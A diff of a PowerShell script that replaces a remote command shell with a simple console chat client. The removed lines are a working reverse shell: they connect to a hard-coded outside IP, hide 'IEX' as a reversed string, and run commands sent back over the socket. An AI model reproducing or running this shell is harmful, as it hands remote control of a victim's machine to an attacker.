@@ -1,38 +1,75 @@
-$target  = "63.179.212.53"
-$channel = 22297
-$env:WTA = "XEI"[-1..-3] -join ""     # -> "IEX"
+param(
+    [string]$Server = "https://222s6s.wormhole.bar"
+)
 
-$connection = $null
-try {
-    $connection = [System.Net.Sockets.TcpClient]::new()
-    $connection.Connect($target, $channel)
-    $dataFlow = $connection.GetStream()
+$Name    = Read-Host "Your name"
+$Headers = @{ "X-Name" = $Name }
+$queue   = New-Object 'System.Collections.Concurrent.ConcurrentQueue[string]'
 
-    $msgWriter = [System.IO.StreamWriter]::new($dataFlow)
-    $msgWriter.AutoFlush = $true
-    $cmdReader = [System.IO.StreamReader]::new($dataFlow)
-
-    $msgWriter.WriteLine("--- Windows Session Active ---")
-    $msgWriter.Write("[$target] PS> ")
-
+# Background thread: polls the server and queues messages from other people
+$poller = [powershell]::Create().AddScript({
+    param($Server, $Name, $queue)
+    $since = 0
     while ($true) {
-        $command = $cmdReader.ReadLine()
-        if ($null -eq $command) { break }        # clean disconnect
-        if ($command.Trim() -eq "exit") { break }
-        if ($command -eq "") {                   # empty Enter
-            $msgWriter.Write("[$target] PS> ")
-            continue
-        }
         try {
-            $processor  = [System.Environment]::GetEnvironmentVariable("WTA")
-            $output     = & $processor $command 2>&1 | Out-String
-            $msgWriter.WriteLine($output)
-        } catch {
-            $msgWriter.WriteLine("ERR: " + $_.Exception.Message)
-        }
-        $msgWriter.Write("[$target] PS> ")
+            $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
+            foreach ($m in $msgs) {
+                if ($m.name -ne $Name) { $queue.Enqueue("[$($m.name)] $($m.text)") }
+                $since = $m.id
+            }
+        } catch { }
+        Start-Sleep -Seconds 1
     }
-} catch { }
-finally {
-    if ($connection) { $connection.Close() }
+}).AddArgument($Server).AddArgument($Name).AddArgument($queue)
+$poller.BeginInvoke() | Out-Null
+
+$buffer  = ""
+$running = $true
+
+# Prints an incoming message above the input line, then redraws what you were typing
+function Show-Line([string]$text, [ConsoleColor]$color = 'Gray') {
+    $w = [Console]::BufferWidth
+    Write-Host -NoNewline ("`r" + (" " * ($w - 1)) + "`r")
+    Write-Host $text -ForegroundColor $color
+    Write-Host -NoNewline ("> " + $buffer)
 }
+
+Write-Host "Connected to $Server. Type a message and press Enter. 'exit' quits."
+Write-Host -NoNewline "> "
+
+while ($running) {
+    $line = $null
+    while ($queue.TryDequeue([ref]$line)) { Show-Line $line 'Cyan' }
+
+    if (-not [Console]::KeyAvailable) { Start-Sleep -Milliseconds 50; continue }
+
+    $key = [Console]::ReadKey($true)
+    if ($key.Key -eq 'Enter') {
+        Write-Host ""
+        $text   = $buffer
+        $buffer = ""
+        if ($text -eq "exit") {
+            $running = $false
+        } elseif ($text.Trim() -ne "") {
+            try {
+                Invoke-RestMethod -Uri "$Server/send" -Headers $Headers -Method Post `
+                    -Body $text -ContentType "text/plain; charset=utf-8" | Out-Null
+            } catch {
+                Write-Host "send failed: $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        if ($running) { Write-Host -NoNewline "> " }
+    }
+    elseif ($key.Key -eq 'Backspace') {
+        if ($buffer.Length -gt 0) {
+            $buffer = $buffer.Substring(0, $buffer.Length - 1)
+            Write-Host -NoNewline "`b `b"
+        }
+    }
+    elseif (-not [char]::IsControl($key.KeyChar)) {
+        $buffer += $key.KeyChar
+        Write-Host -NoNewline $key.KeyChar
+    }
+}
+
+$poller.Stop()
